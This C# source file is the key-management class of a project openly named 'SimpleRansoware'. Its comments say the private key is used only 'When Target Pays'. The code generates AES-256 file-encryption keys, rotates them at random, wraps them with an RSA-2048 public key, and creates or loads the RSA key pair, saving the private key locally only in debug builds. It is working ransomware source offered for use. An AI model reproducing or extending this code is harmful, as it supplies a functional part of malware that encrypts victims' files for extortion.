using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;

namespace SimpleRansoware
{
    /// <summary>
    /// Cripto Key Manager
    /// </summary>
    public sealed class CriptoKeyManager
    {
        private CriptoKeyManager() { }

        /// <summary>
        /// Current Public Key
        /// </summary>
        private static SecureString PUBLIC_KEY = null;

        /// <summary>
        /// Current Private Key (Usually Null) - Used only When Target Pays to Decript there Machine
        /// </summary>
        private static SecureString PRIVATE_KEY = null;

        /// <summary>
        /// Current Key used to Encript File
        /// </summary>
        public static Byte[] CURRENT_FILE_ENCRIPTION_KEY = null;

        /// <summary>
        /// Current IV used to Encript File
        /// </summary>
        public static Byte[] CURRENT_FILE_ENCRIPTION_IV = null;

        /// <summary>
        /// AES Engine
        /// </summary>
        public static Aes CurrentAesEncriptedEngine = null;

        /// <summary>
        /// Generates a new AES-256 Key Pair
        /// </summary>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void GenAesKeyPair(ref byte[] key, ref byte[] iv)
        {
            using (Aes aes = new AesManaged())
            {
                aes.KeySize = ConfigurationManager.CHIPER_KEY_SIZE;
                aes.Mode = ConfigurationManager.CHIPER_MODE;
                aes.Padding = ConfigurationManager.CHIPER_PADDING_MODE;

                aes.GenerateIV();
                aes.GenerateKey();

                byte[] volatileKey = aes.Key;
                byte[] volatileIv = aes.IV;

                key = new byte[volatileKey.Length];
                iv = new byte[volatileIv.Length];

                Array.Copy(volatileKey, key, volatileKey.Length);
                Array.Copy(volatileIv, iv, volatileIv.Length);

                Common.ClearArray(ref volatileKey);
                Common.ClearArray(ref volatileIv);

                aes.Clear();
            }
        }

        /// <summary>
        /// Protect a AES Key
        /// </summary>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void ProtectAesKey(ref Aes currentAesEngine, ref Byte[] currentKey, ref Byte[] currentIv, ref SecureString publicKey)
        {
            // Close Previous Engine
            if (currentAesEngine != null)
            {
                ((IDisposable) currentAesEngine).Dispose();
            }

            // Restart AES Engine
            currentAesEngine = new AesManaged();
            currentAesEngine.KeySize = ConfigurationManager.CHIPER_KEY_SIZE;
            currentAesEngine.Mode = ConfigurationManager.CHIPER_MODE;
            currentAesEngine.Padding = ConfigurationManager.CHIPER_PADDING_MODE;
            currentAesEngine.Key = currentKey;
            currentAesEngine.IV = currentIv;

            // Encript Current Key and Password
            String pKey = "";
            Common.OpenSecureString(ref pKey, ref publicKey);

            // Load Key Into Cypher
            using (RSACryptoServiceProvider rsaAlgh = new RSACryptoServiceProvider())
            {
                // Load
                rsaAlgh.FromXmlString(pKey);

                // Encript
                currentKey = rsaAlgh.Encrypt(currentKey, true);
                currentIv = rsaAlgh.Encrypt(currentIv, true);
            }

            Common.ClearString(ref pKey);

        }

        /// <summary>
        /// Unprotect a AES Key
        /// </summary>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void UnprotectAesKey(ref byte[] protectedKey, ref byte[] key, ref byte[] protectedIv, ref byte[] iv)
        {
            // Encript Current Key and Password
            string pKey = "";
            Common.OpenSecureString(ref pKey, ref PRIVATE_KEY);

            // Load Key Into Cypher
            using (RSACryptoServiceProvider rsaAlgh = new RSACryptoServiceProvider())
            {
                // Load
                rsaAlgh.FromXmlString(pKey);

                // Encript
                key = rsaAlgh.Decrypt(protectedKey, true);
                iv = rsaAlgh.Decrypt(protectedIv, true);
            }

            Common.ClearString(ref pKey);
        }



        /// <summary>
        /// Generates a RSA-2048 Public and Private Key
        /// </summary>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static unsafe void GenRsaKeyPair(ref SecureString privateAndPublicKey, ref SecureString publicKeyOnly)
        {
            using (RSA rsa = new RSACryptoServiceProvider())
            {
                rsa.KeySize = 2048;

                string pri = rsa.ToXmlString(true);

                fixed (char* p = pri)
                {
                    privateAndPublicKey = new SecureString(p, pri.Length);
                    privateAndPublicKey.MakeReadOnly();
                }

                Common.ClearString(ref pri);


                string pub = rsa.ToXmlString(false);

                fixed (char* p = pub)
                {
                    publicKeyOnly = new SecureString(p, pub.Length);
                    publicKeyOnly.MakeReadOnly();
                }

                Common.ClearString(ref pub);
            }
        }



        /// <summary>
        /// Rotates a Chyper Key
        /// </summary>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void RotateAesKey()
        {
            if (CURRENT_FILE_ENCRIPTION_KEY == null)
            {
#if DEBUG
                Trace.WriteLine("[+] Fresh Key Generated");
#endif
                GenAesKeyPair(ref CURRENT_FILE_ENCRIPTION_KEY, ref CURRENT_FILE_ENCRIPTION_IV);
                ProtectAesKey(ref CurrentAesEncriptedEngine, ref CURRENT_FILE_ENCRIPTION_KEY, ref CURRENT_FILE_ENCRIPTION_IV, ref PUBLIC_KEY);
            }
            else if (Common.random.Next(0, 100) == 99) // 1% of Chance to Rotate Key
            {
#if DEBUG
                Trace.WriteLine("[+] Key is Rotated");
#endif
                GenAesKeyPair(ref CURRENT_FILE_ENCRIPTION_KEY, ref CURRENT_FILE_ENCRIPTION_IV);
                ProtectAesKey(ref CurrentAesEncriptedEngine, ref CURRENT_FILE_ENCRIPTION_KEY, ref CURRENT_FILE_ENCRIPTION_IV, ref PUBLIC_KEY);
            }
        }


        /// <summary>
        /// Load a Local Public Key OR Generate a New One
        /// </summary>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public unsafe static void EnsureLocalPublicKey()
        {
#if DEBUG
            Trace.WriteLine("[*] EnsureLocalPublicKey");
            Trace.Indent();
#endif

            if (File.Exists(ConfigurationManager.LOCAL_PUB_KEY_NAME))
            {
#if DEBUG
                Trace.WriteLine("[+] Loading File");
#endif
                // Load Public Key
                using (FileStream fs = File.OpenRead(ConfigurationManager.LOCAL_PUB_KEY_NAME))
                {
                    // Read
                    byte[] unsecureArray = new byte[fs.Length];
                    fs.Read(unsecureArray, 0, unsecureArray.Length);

                    // To String
                    string unsecureData = Encoding.ASCII.GetString(unsecureArray);
                    Common.ClearArray(ref unsecureArray);

                    // To SecureString
                    fixed (char* p = unsecureData)
                    {
                        PUBLIC_KEY = new SecureString(p, unsecureData.Length);
                        PUBLIC_KEY.MakeReadOnly();
                    }

                    Common.ClearString(ref unsecureData);
                }

                // Load Private Key
                using (FileStream fs = File.OpenRead(ConfigurationManager.LOCAL_PRI_KEY_NAME))
                {
                    // Read
                    Byte[] unsecureArray = new Byte[fs.Length];
                    fs.Read(unsecureArray, 0, unsecureArray.Length);

                    // To String
                    String unsecureData = ASCIIEncoding.ASCII.GetString(unsecureArray);
                    Common.ClearArray(ref unsecureArray);

                    // To SecureString
                    fixed (char* p = unsecureData)
                    {
                        PRIVATE_KEY = new SecureString(p, unsecureData.Length);
                        PRIVATE_KEY.MakeReadOnly();
                    }

                    Common.ClearString(ref unsecureData);
                }
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+] Creating New File");
#endif
                // Generate a New One
                CriptoKeyManager.GenRsaKeyPair(ref PRIVATE_KEY, ref PUBLIC_KEY);

                // Save Into File
                using (FileStream fs = new FileStream(ConfigurationManager.LOCAL_PUB_KEY_NAME, FileMode.Create))
                {
                    // Open
                    String unsecureContent = "";
                    Common.OpenSecureString(ref unsecureContent, ref PUBLIC_KEY);

                    // To Array
                    Byte[] unsecureArray = ASCIIEncoding.ASCII.GetBytes(unsecureContent);
                    Common.ClearString(ref unsecureContent);

                    // To File
                    fs.Write(unsecureArray, 0, unsecureArray.Length);
                    Common.ClearArray(ref unsecureArray);
                }

#if DEBUG
                // Se Debug, grava a Private Key no Local Também ;)
                using (FileStream fs = new FileStream(ConfigurationManager.LOCAL_PRI_KEY_NAME, FileMode.Create))
                {
                    // Open
                    String unsecureContent = "";
                    Common.OpenSecureString(ref unsecureContent, ref PRIVATE_KEY);

                    // To Array
                    Byte[] unsecureArray = ASCIIEncoding.ASCII.GetBytes(unsecureContent);
                    Common.ClearString(ref unsecureContent);

                    // To File
                    fs.Write(unsecureArray, 0, unsecureArray.Length);
                    Common.ClearArray(ref unsecureArray);
                }
#endif
            }

#if DEBUG
            Trace.Unindent();
#endif
        }


    }
}
